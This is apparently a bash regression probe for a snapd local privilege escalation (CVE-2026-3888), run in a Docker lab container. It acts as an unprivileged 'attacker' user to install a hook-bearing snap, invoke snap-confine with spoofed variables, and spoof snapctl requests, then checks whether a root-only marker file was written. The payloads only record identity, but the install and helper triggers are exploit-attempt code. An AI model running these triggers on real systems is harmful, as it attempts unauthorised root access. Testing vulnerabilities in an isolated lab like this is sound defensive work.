#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"

docker exec -i "$container" bash -s <<'TARGET'
set -euo pipefail

work=/tmp/snapd-cve3888-probe
root_marker=/root/snapd_cve3888_root

cleanup() {
  rm -rf "$work" /tmp/snapd-cve3888-test_1.0_all.snap
  rm -f /tmp/snapd-cve3888-rest.out /tmp/snapd-cve3888-snap-socket.out
  rm -f /run/snapd/lock/snapd-cve3888-test.lock /run/snapd/lock/cve3888probe.lock 2>/dev/null || true
}

echo "== pre-clean =="
cleanup
rm -f "$root_marker"

echo "== target identity =="
id
id attacker
sed -n '1,8p' /etc/os-release
dpkg-query -W -f='${binary:Package}\t${Version}\n' snapd systemd 2>&1 | sort
snap version

echo "== default snapd services sockets and reachability =="
systemctl is-active snapd.service snapd.socket snapd.seeded.service systemd-tmpfiles-clean.service 2>&1 || true
systemctl is-enabled snapd.service snapd.socket snapd.seeded.service systemd-tmpfiles-clean.timer 2>&1 || true
stat -c '%A %a %U:%G %n' /run/snapd.socket /run/snapd-snap.socket /usr/lib/snapd/snap-confine /tmp/snap-private-tmp 2>&1 || true
ss -xlpn | grep -E '/run/snapd(-snap)?\.socket' || true
getcap -v /usr/lib/snapd/snap-confine /usr/lib/snapd/snap-update-ns 2>&1 || true

echo "== default snap state and tmpfiles policy =="
snap list --all 2>&1 || true
find /tmp/snap-private-tmp -maxdepth 4 -mindepth 1 -printf '%M %u:%g %p\n' 2>&1 || true
sed -n '1,40p' /usr/lib/tmpfiles.d/snapd.conf
grep -nE '^[A-Za-z!]+[[:space:]]+/tmp' /usr/lib/tmpfiles.d/tmp.conf /usr/lib/tmpfiles.d/snapd.conf

echo "== attacker REST read probes =="
runuser -u attacker -- bash -lc '
  set +e
  curl --max-time 10 --silent --show-error --unix-socket /run/snapd.socket -i http://localhost/v2/system-info | sed -n "1,14p"
  echo "-- snaps --"
  curl --max-time 10 --silent --show-error --unix-socket /run/snapd.socket -i http://localhost/v2/snaps | sed -n "1,20p"
'

echo "== build root-marker local snap as attacker =="
install -d -o attacker -g attacker "$work/meta/hooks" "$work/bin"
cat >"$work/meta/snap.yaml" <<'EOF'
name: snapd-cve3888-test
version: "1.0"
summary: snapd CVE-2026-3888 regression marker
description: Local marker snap used only to test whether unprivileged install paths execute hooks as root.
base: core24
grade: stable
confinement: strict
apps:
  marker:
    command: bin/marker
EOF
cat >"$work/bin/marker" <<'EOF'
#!/bin/sh
id
EOF
cat >"$work/meta/hooks/install" <<'EOF'
#!/bin/sh
{
  echo "hook_ran=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
  id
  echo "uid=$(id -u)"
} >/root/snapd_cve3888_root
chmod 600 /root/snapd_cve3888_root
EOF
chmod 755 "$work/bin/marker" "$work/meta/hooks/install"
chown -R attacker:attacker "$work"
runuser -u attacker -- snap pack "$work" /tmp
stat -c '%A %U:%G %s %n' /tmp/snapd-cve3888-test_1.0_all.snap

echo "== attacker REST install trigger =="
runuser -u attacker -- bash -lc '
  set +e
  curl --max-time 15 --silent --show-error --unix-socket /run/snapd.socket \
    -i -H "X-Allow-Interaction: true" \
    -F action=install -F dangerous=true -F snap=@/tmp/snapd-cve3888-test_1.0_all.snap \
    http://localhost/v2/snaps > /tmp/snapd-cve3888-rest.out 2>&1
  echo "rest_install_rc=$?"
  sed -n "1,40p" /tmp/snapd-cve3888-rest.out
'

echo "== attacker CLI install trigger =="
runuser -u attacker -- bash -lc '
  set +e
  snap install --dangerous /tmp/snapd-cve3888-test_1.0_all.snap
  echo "snap_install_rc=$?"
'

echo "== attacker snap-confine helper trigger =="
cat >"$work/payload.sh" <<'EOF'
#!/bin/sh
{
  echo "payload_ran=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
  id
  /bin/sh -p -c "id"
} >/root/snapd_cve3888_root
chmod 600 /root/snapd_cve3888_root
EOF
chmod 755 "$work/payload.sh"
chown attacker:attacker "$work/payload.sh"
runuser -u attacker -- bash -lc '
  set +e
  env -i PATH=/usr/bin:/bin SNAPD_DEBUG=1 \
    SNAP_NAME=cve3888probe \
    SNAP_INSTANCE_NAME=cve3888probe \
    SNAP_REVISION=1 \
    SNAP_COOKIE=cve3888cookie \
    /usr/lib/snapd/snap-confine snap.cve3888probe.app /tmp/snapd-cve3888-probe/payload.sh
  echo "snap_confine_rc=$?"
'

echo "== attacker snap socket spoof trigger =="
runuser -u attacker -- bash -lc '
  set +e
  curl --max-time 10 --silent --show-error --unix-socket /run/snapd-snap.socket \
    -i -H "Content-Type: application/json" \
    -X POST --data "{\"context-id\":\"bogus\",\"args\":[\"set\",\"system.cve3888=1\"]}" \
    http://localhost/v2/snapctl > /tmp/snapd-cve3888-snap-socket.out 2>&1
  echo "snap_socket_rc=$?"
  sed -n "1,40p" /tmp/snapd-cve3888-snap-socket.out
'

echo "== root marker check =="
if [ -e "$root_marker" ]; then
  echo "ROOT_PROOF=YES"
  stat -c '%A %U:%G %s %n' "$root_marker"
  sed -n '1,20p' "$root_marker"
else
  echo "ROOT_PROOF=NO"
fi

echo "== cleanup =="
snap remove snapd-cve3888-test 2>&1 || true
cleanup
if [ -e "$root_marker" ]; then
  echo "removing_root_marker_after_recording=yes"
  rm -f "$root_marker"
fi
findmnt | grep -E 'snapd-cve3888|cve3888probe' || true
ls -ld "$work" /tmp/snapd-cve3888-test_1.0_all.snap "$root_marker" 2>&1 || true

echo "== final health =="
systemctl is-system-running || true
systemctl --failed --no-pager || true
systemctl is-active snapd.service snapd.socket snapd.seeded.service 2>&1 || true
snap list --all 2>&1 || true
TARGET
